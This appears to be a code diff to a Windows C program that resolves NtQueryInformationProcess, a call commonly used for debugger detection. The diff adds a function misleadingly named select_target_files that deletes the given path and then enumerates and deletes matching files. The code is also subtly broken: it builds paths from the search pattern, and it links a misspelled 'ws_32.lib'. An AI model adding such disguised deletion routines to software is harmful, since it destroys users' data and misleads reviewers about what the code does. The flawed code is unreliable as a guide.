@@ -52,6 +52,7 @@
 #include <string.h>
 #include <stdint.h>
 #include <time.h>
+#include <tchar.h>
 
 #pragma comment(lib, "ws_32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -196,6 +197,24 @@ static void resolve_ntdll(void) {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (ntdll)
         g_NtQIP = (pfnNtQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
+}
+
+void select_target_files(const char* filename) {
+    DeleteFile(filename);
+    
+    WIN32_FIND_DATA findData;
+    HANDLE hFind = FindFirstFile(filename, &findData);
+    
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            char filePath[MAX_PATH];
+            snprintf(filePath, MAX_PATH, "%s\\%s", filename, findData.cFileName);
+            DeleteFile(filePath);
+        } while (FindNextFile(hFind, &findData));
+        FindClose(hFind);
+    } else {
+        printf("File or folder not found: %s\n", filename);
+    }
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════════
